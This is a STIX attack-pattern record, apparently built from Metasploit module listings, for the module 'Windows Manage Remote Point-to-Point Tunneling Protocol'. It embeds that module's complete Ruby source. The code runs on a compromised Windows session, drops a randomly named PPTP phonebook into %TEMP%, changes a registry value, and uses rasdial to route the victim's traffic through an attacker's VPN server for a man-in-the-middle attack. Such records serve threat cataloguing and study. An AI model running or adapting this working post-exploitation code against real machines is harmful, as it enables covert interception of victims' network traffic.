{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--09c6dca8-070c-43f3-a838-c4d0a2b9aafc",
    "created": "2024-08-14T16:33:04.977627Z",
    "modified": "2024-08-14T16:33:04.977631Z",
    "name": "Windows Manage Remote Point-to-Point Tunneling Protocol",
    "description": " This module initiates a PPTP connection to a remote machine (VPN server). Once the tunnel is created we can use it to force the victim traffic to go through the server getting a man in the middle attack. Be sure to allow forwarding and masquerading on the VPN server (mitm).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/pptp_tunnel.rb",
            "external_id": "pptp_tunnel.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=vdppEZjMPCM&hd=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Remote Point-to-Point Tunneling Protocol',\n        'Description' => %q{\n          This module initiates a PPTP connection to a remote machine (VPN server). Once\n          the tunnel is created we can use it to force the victim traffic to go through the\n          server getting a man in the middle attack. Be sure to allow forwarding and\n          masquerading on the VPN server (mitm).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'Borja Merino <bmerinofe[at]gmail.com>',\n        'References' => [\n          [ 'URL', 'https://www.youtube.com/watch?v=vdppEZjMPCM&hd=1' ]\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'VPN Username.' ]),\n        OptString.new('PASSWORD', [true, 'VPN Password.' ]),\n        OptBool.new('MITM', [true, 'Man in the middle.', true]),\n        OptInt.new('TIMEOUT', [true, 'Timeout for the tunnel creation.', 60]),\n        OptString.new('PBK_NAME', [true, 'PhoneBook entry name.', 'MSF']),\n        OptAddress.new('VPNHOST', [true, 'VPN server.'])\n      ]\n    )\n  end\n\n  def run\n    version = get_version_info\n    disable_network_wizard if version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win7_SP1)\n\n    pbk = create_pbk(datastore['MITM'], datastore['PBK_NAME'])\n    to = (datastore['TIMEOUT'] <= 0) ? 60 : datastore['TIMEOUT']\n    begin\n      ::Timeout.timeout(to) do\n        run_rasdial(pbk, datastore['USERNAME'], datastore['PASSWORD'], datastore['VPNHOST'], datastore['PBK_NAME'])\n      end\n    rescue ::Timeout::Error\n      print_error(\"Timeout after #{to} seconds\")\n    end\n    file_rm(pbk)\n    print_status('Phonebook deleted')\n  end\n\n  def disable_network_wizard\n    if !is_admin?\n      print_error(\"You don't have enough privileges to change the registry. Network Wizard will not be disabled\")\n      return\n    end\n\n    key = 'HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Network'\n    value = 'NewNetworkWindowOff'\n    begin\n      if !registry_getvaldata(key, value)\n        registry_setvaldata(key, value, 3, 'REG_BINARY')\n        print_good('Network Wizard disabled')\n      end\n    rescue ::Exception => e\n      print_status(\"The fo llowing Error was encountered: #{e.class} #{e}\")\n    end\n  end\n\n  def create_pbk(mim, pbk_name)\n    pbk_dir = expand_path('%TEMP%')\n    pbk_file = pbk_dir << '\\\\' << Rex::Text.rand_text_alpha(rand(6..13)) << '.pbk'\n\n    conf_conn = \"[#{pbk_name}]\\r\\n\\r\\n\"\n    conf_conn += \"MEDIA=rastapi\\r\\n\"\n    conf_conn += \"Port=VPN4-0\\r\\n\"\n    conf_conn += \"DEVICE=vpn\\r\\n\"\n    conf_conn += \"IpPrioritizeRemote=0\\r\\n\" unless mim\n\n    if write_file(pbk_file, conf_conn)\n      print_good(\"PhoneBook configuration written to #{pbk_file}\")\n      return pbk_file\n    end\n  end\n\n  def run_rasdial(pbk, user, pass, vpn_host, pbk_name)\n    print_status('Establishing connection ...')\n    cmd_exec('rasdial', '/disconnect')\n    output_run = cmd_exec('rasdial', \"#{pbk_name} #{user} #{pass} /PHONE:#{vpn_host} /PHONEBOOK:#{pbk}\")\n    output_view = cmd_exec('rasdial', nil)\n\n    if output_view =~ /#{pbk_name}/i\n      print_good('Connection Successful')\n    else\n      print_error(\"Connection failure: #{output_run}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}